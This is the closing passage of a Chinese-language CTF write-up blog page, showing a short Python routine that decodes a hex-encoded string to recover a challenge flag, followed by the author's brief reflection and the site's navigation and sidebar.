+<p>def decode(s):<br>    charcode = []<br>    i = 0<br>    while i&lt;len(s):<br>        charcode.append(int(s[i:i+2],16))<br>        i = i + 2<br>    charcode = [255-i for i in charcode]</p>
+<pre><code>chars = \[\]
+for i in charcode:
+    if 127&lt;i+128&lt;255:
+        chars.append(i+128)
+    elif 0&lt;i-128&lt;128:
+        chars.append(i-128)
+    else: chars.append(i)
+result = \[chr(i) for i in chars\]
+return &#39;&#39;.join(result)
+</code></pre>
+<p>t = decode(s)<br>print(t)</p>
+<p>得到flag：</p>
+<p><img src="http://106.54.80.67/wp-content/uploads/2019/10/543_1.png"></p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>从印象笔记里搬过来的wp，第一次做的ctf和第一次写的wp总是特别有纪念意义。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/10/09/aegis-recruit-writeup/" data-id="ckpw1c6v3001wfww00gxy5km6" data-title="Aegis recruit WriteUp" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/10/16/cnss-true-love-writeup/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          CNSS True_Love WriteUp
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/09/rsa%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E7%B3%BB/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">RSA公钥密码体系</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Crypto/">Crypto</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Notes/">Notes</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUp-in-platform/">WriteUp in platform</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/uncategorized/">uncategorized</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Flask/" rel="tag">Flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/" rel="tag">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/" rel="tag">sql约束攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%A2%E6%88%B7%E7%AB%AFsession/" rel="tag">客户端session</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Flask/" style="font-size: 10px;">Flask</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/sqli/" style="font-size: 10px;">sqli</a> <a href="/tags/sql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/" style="font-size: 10px;">sql约束攻击</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">反序列化</a> <a href="/tags/%E5%AE%A2%E6%88%B7%E7%AB%AFsession/" style="font-size: 10px;">客户端session</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/05/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%89%E5%85%A8%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2021/05/05/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/02/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/">关于反序列化漏洞的一点思考</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/11/ha1cyon-ctf%E5%B0%8F%E8%AE%B0/">Ha1cyon ctf小记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/29/xxe%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">XXE任意文件读取</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
